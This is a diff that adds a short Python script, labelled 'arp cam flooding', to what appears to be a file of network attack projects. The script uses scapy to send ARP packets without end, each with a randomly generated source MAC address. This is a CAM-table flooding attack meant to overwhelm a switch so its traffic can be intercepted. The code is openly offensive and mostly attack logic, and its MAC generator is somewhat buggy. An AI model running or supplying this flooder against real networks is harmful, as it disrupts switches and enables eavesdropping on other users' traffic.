@@ -92,3 +92,36 @@ def main():
 main() 
 
 
+
+
+project 2 #arp cam flooding 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import scapy.all 
+import random
+
+
+
+
+
+def mac_generator(): 
+	list = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
+	mac = "" 
+	for i in range(17):
+		if len(mac) not in (2, 5, 8, 11, 14):
+			mac_word = random.randint(0, 15)
+			mac += list[mac_word - 1]
+		else:
+			mac += ":" 
+	return mac
+
+
+def main(): 
+	while True:
+		mac = mac_generator() 
+		arp = scapy.all.ARP()
+		arp.hwsrc = mac 
+		scapy.all.send(arp)
+	
+
+main() 
+
